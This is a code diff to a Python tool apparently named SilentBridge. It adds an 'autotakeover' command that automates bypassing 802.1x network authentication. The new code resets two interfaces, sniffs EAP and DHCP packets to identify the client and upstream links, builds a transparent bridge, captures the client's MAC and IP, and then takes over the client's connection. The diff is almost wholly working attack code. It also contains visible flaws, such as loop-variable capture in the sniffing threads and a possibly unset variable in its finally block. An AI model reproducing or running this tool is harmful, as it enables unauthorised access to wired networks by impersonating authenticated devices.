@@ -43,6 +43,14 @@ class SilentBridge:
         analyze_parser.add_argument('--timeout', type=int, default=30, help='Timeout in seconds for analysis')
         analyze_parser.add_argument('--sidechannel', required=True, help='Side channel interface for management')
         
+        # Autotakeover command
+        autotakeover_parser = subparsers.add_parser('autotakeover', help='Automatically analyze, bridge and takeover client connection')
+        autotakeover_parser.add_argument('--interfaces', nargs=2, required=True, help='Two ethernet interfaces to use')
+        autotakeover_parser.add_argument('--sidechannel', required=True, help='Side channel interface for management')
+        autotakeover_parser.add_argument('--timeout', type=int, default=30, help='Timeout in seconds for analysis')
+        autotakeover_parser.add_argument('--bridge', default='br0', help='Bridge interface name')
+        autotakeover_parser.add_argument('--veth-name', default='veth0', help='Name for the virtual ethernet device')
+        
         # Create bridge command
         create_parser = subparsers.add_parser('create', help='Create a transparent bridge')
         create_parser.add_argument('--bridge', required=True, help='Bridge interface name')
@@ -109,6 +117,8 @@ class SilentBridge:
             self.force_reauthentication()
         elif self.args.command == 'takeover':
             self.takeover_client()
+        elif self.args.command == 'autotakeover':
+            self.autotakeover()
         else:
             self.parser.print_help()
     
@@ -871,6 +881,193 @@ class SilentBridge:
         except Exception as e:
             print(f"[!] Error handling NetworkManager for {interface}: {e}")
             return False
+
+    def reset_interface(self, interface):
+        """Reset an interface to a clean state"""
+        try:
+            # Bring interface down
+            if self.network_stack['ip']:
+                self.run_command(f"ip link set {interface} down", ignore_errors=True)
+            else:
+                self.run_command(f"ifconfig {interface} down", ignore_errors=True)
+            
+            # Remove from NetworkManager if present
+            if self.network_stack['networkmanager']:
+                self.handle_networkmanager_interface(interface, 'unmanage')
+            
+            # Flush IP addresses
+            if self.network_stack['ip']:
+                self.run_command(f"ip addr flush dev {interface}", ignore_errors=True)
+            
+            # Reset interface flags
+            self.run_command(f"ip link set {interface} promisc off", ignore_errors=True)
+            
+            return True
+        except Exception as e:
+            print(f"[!] Error resetting interface {interface}: {e}")
+            return False
+
+    def cleanup_autotakeover(self):
+        """Clean up after failed autotakeover"""
+        print("[*] Cleaning up...")
+        
+        # Destroy bridge if it exists
+        if self.check_interface_exists(self.args.bridge):
+            self.destroy_bridge()
+        
+        # Reset interfaces
+        for iface in self.args.interfaces:
+            self.reset_interface(iface)
+            if self.network_stack['networkmanager']:
+                self.handle_networkmanager_interface(iface, 'manage')
+                self.run_command(f"nmcli device connect {iface}", ignore_errors=True)
+            else:
+                if self.network_stack['ip']:
+                    self.run_command(f"ip link set {iface} up", ignore_errors=True)
+                else:
+                    self.run_command(f"ifconfig {iface} up", ignore_errors=True)
+
+    def autotakeover(self):
+        """Automatically analyze, bridge and takeover client connection"""
+        print("[*] Starting autotakeover operation...")
+        success = False
+        
+        try:
+            # Check if interfaces exist
+            for iface in self.args.interfaces:
+                if not self.check_interface_exists(iface):
+                    print(f"[!] Interface {iface} does not exist!")
+                    return
+            
+            # Step 1: Reset interfaces to clean state
+            print("[*] Resetting interfaces to clean state...")
+            for iface in self.args.interfaces:
+                if not self.reset_interface(iface):
+                    raise Exception(f"Failed to reset interface {iface}")
+            
+            print("[*] Waiting 10 seconds for interfaces to settle...")
+            time.sleep(10)
+            
+            # Step 2: Analyze network to determine interfaces
+            print("[*] Starting network analysis...")
+            # Create temporary args for analysis
+            original_args = self.args
+            analysis_args = argparse.Namespace(
+                interfaces=self.args.interfaces,
+                timeout=self.args.timeout,
+                sidechannel=self.args.sidechannel
+            )
+            self.args = analysis_args
+            
+            # Start packet capture
+            threads = []
+            for iface in self.args.interfaces:
+                thread = Thread(target=lambda: sniff(
+                    iface=iface,
+                    prn=self.packet_callback,
+                    store=0,
+                    stop_filter=lambda _: self.stop_sniffing.is_set()
+                ))
+                thread.daemon = True
+                thread.start()
+                threads.append(thread)
+            
+            print("[*] Listening for EAP and DHCP packets...")
+            print(f"[*] Analysis will timeout in {self.args.timeout} seconds")
+            print("[*] Please initiate 802.1x authentication or DHCP request on the client...")
+            
+            # Analyze packets
+            config = self.analyze_packets(self.args.timeout)
+            
+            # Stop packet capture
+            self.stop_sniffing.set()
+            for thread in threads:
+                thread.join()
+            
+            # Restore original args
+            self.args = original_args
+            
+            if not config['phy_interface'] or not config['upstream_interface']:
+                raise Exception("Could not determine interface roles")
+            
+            # Step 3: Create bridge with analyzed interfaces
+            print("[*] Creating bridge with detected configuration...")
+            bridge_args = argparse.Namespace(
+                bridge=self.args.bridge,
+                phy=config['phy_interface'],
+                upstream=config['upstream_interface'],
+                sidechannel=self.args.sidechannel,
+                egress_port=22,
+                use_legacy=False
+            )
+            self.args = bridge_args
+            self.create_transparent_bridge()
+            
+            # Step 4: Wait for client authentication and DHCP
+            print("[*] Waiting for client authentication and DHCP...")
+            time.sleep(5)  # Give the bridge time to stabilize
+            
+            # Update config with client information
+            self.args = analysis_args
+            self.stop_sniffing.clear()
+            
+            # Start new packet capture for client info
+            threads = []
+            for iface in [config['phy_interface'], config['upstream_interface']]:
+                thread = Thread(target=lambda: sniff(
+                    iface=iface,
+                    prn=self.packet_callback,
+                    store=0,
+                    stop_filter=lambda _: self.stop_sniffing.is_set()
+                ))
+                thread.daemon = True
+                thread.start()
+                threads.append(thread)
+            
+            # Analyze packets for client information
+            client_config = self.analyze_packets(self.args.timeout)
+            
+            # Stop packet capture
+            self.stop_sniffing.set()
+            for thread in threads:
+                thread.join()
+            
+            if not client_config['client_mac'] or not client_config['client_ip']:
+                raise Exception("Could not obtain client information")
+            
+            # Step 5: Perform takeover
+            print("[*] Initiating takeover with obtained configuration...")
+            takeover_args = argparse.Namespace(
+                bridge=self.args.bridge,
+                phy=config['phy_interface'],
+                veth_name=self.args.veth_name,
+                client_mac=client_config['client_mac'],
+                client_ip=client_config['client_ip'],
+                netmask='255.255.255.0',  # Default netmask
+                gateway_ip=client_config['router_ip'] if client_config['router_ip'] else None
+            )
+            
+            if not takeover_args.gateway_ip:
+                # Try to determine gateway from client IP
+                ip_parts = client_config['client_ip'].split('.')
+                ip_parts[3] = '1'
+                takeover_args.gateway_ip = '.'.join(ip_parts)
+            
+            self.args = takeover_args
+            self.takeover_client()
+            
+            success = True
+            print("[+] Autotakeover completed successfully!")
+            
+        except Exception as e:
+            print(f"[!] Error during autotakeover: {e}")
+            if not success:
+                self.cleanup_autotakeover()
+                print("[*] System restored to original state")
+        
+        finally:
+            # Restore original args
+            self.args = original_args
 
 if __name__ == "__main__":
     bridge = SilentBridge()
